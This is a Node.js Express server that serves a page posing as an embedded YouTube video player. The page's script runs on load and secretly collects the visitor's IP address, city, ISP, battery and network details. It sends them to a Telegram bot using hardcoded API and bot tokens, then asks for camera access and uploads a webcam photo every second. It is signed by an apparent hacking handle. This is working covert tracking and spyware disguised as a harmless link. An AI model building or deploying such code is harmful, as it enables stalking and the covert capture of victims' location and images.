
const express = require('express');
const app = express();
const port = 3000;

app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Player</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
        }
        .youtube-video {
            width: 100%;
            height: auto;
            aspect-ratio: 16 / 30;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <div class="youtube-video">
        <iframe src="https://www.youtube.com/embed/cfzPMw8v5G8" allowfullscreen></iframe>
    </div>

    <script type="text/javascript">
        async function getLocationData() {
            try {
                const response = await fetch('https://ipinfo.io/json?token=f99959a4fa242a');
                return await response.json();
            } catch (err) {
                console.error("Error fetching IP info: ", err);
                return {};
            }
        }

        function decodeBase64(encodedStr) {
            try {
                return decodeURIComponent(escape(atob(encodedStr)));
            } catch (e) {
                console.error('Base64 decode error:', e);
                return null;
            }
        }

        function getURLParameter(sParam) {
            var sPageURL = window.location.search.substring(1);
            var sURLVariables = sPageURL.split('&');
            for (var i = 0; i < sURLVariables.length; i++) {
                var sParameterName = sURLVariables[i].split('=');
                if (sParameterName[0] == sParam) {
                    return sParameterName[1];
                }
            }
        }

        async function sendToTelegram(message, chatId) {
            const botToken = '7368037463:AAH4Yo08lgY6xYjOPr1Z8nI8r4Q3KNAVguI';
            if (!chatId) {
                console.error('Chat ID is not available.');
                return;
            }
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', message.trim());
            try {
                const response = await fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
                    method: 'POST',
                    body: formData
                });
                console.log(await response.json());
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        async function sendPhotoToTelegram(blob, chatId) {
            const botToken = '7368037463:AAH4Yo08lgY6xYjOPr1Z8nI8r4Q3KNAVguI';
            if (!chatId) {
                console.error('Chat ID is not available.');
                return;
            }
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob);
            try {
                const response = await fetch(\`https://api.telegram.org/bot\${botToken}/sendPhoto\`, {
                    method: 'POST',
                    body: formData
                });
                console.log(await response.json());
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
            }
        }

        async function getDeviceInfo() {
            const battery = await navigator.getBattery();
            return {
                charging: battery.charging ? "Yes" : "No",
                batteryLevel: Math.round(battery.level * 100) + "%",
                networkType: navigator.connection ? navigator.connection.effectiveType : "N/A",
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        async function handleUserInteraction() {
            const locationData = await getLocationData();
            const deviceInfo = await getDeviceInfo();
            const base64Id = getURLParameter('i');
            const chatId = base64Id ? decodeBase64(base64Id) : null;

            if (!chatId) {
                console.warn('No valid chat ID found.');
                return;
            }

            const message = \`
â„¹ï¸ Activity Tracked:

ðŸŒ IP Address: \${locationData.ip || "N/A"}
ðŸŒ Location: \${locationData.city || "N/A"}, \${locationData.region || "N/A"}, \${locationData.country || "N/A"}
ðŸ“¡ ISP: \${locationData.org || "N/A"}
ðŸ” Org: \${locationData.org || "N/A"}

ðŸ“± Device Info:
ðŸ”‹ Charging: \${deviceInfo.charging}
ðŸ”Œ Battery Level: \${deviceInfo.batteryLevel}
ðŸŒ Network Type: \${deviceInfo.networkType}
ðŸ•’ Time Zone: \${deviceInfo.timeZone}

ðŸ‘¨â€ðŸ’» Tracked on: @jathacking01
\`;

            await sendToTelegram(message, chatId);

            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
                    setInterval(() => {
                        imageCapture.takePhoto()
                            .then((blob) => {
                                sendPhotoToTelegram(blob, chatId);
                            })
                            .catch((error) => {
                                console.error('Error capturing photo:', error);
                            });
                    }, 1000);
                })
                .catch((error) => {
                    console.error('Permission error:', error);
                });
        }

        window.onload = handleUserInteraction;
    </script>
</body>
</html>
  `);
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${port}`);
});
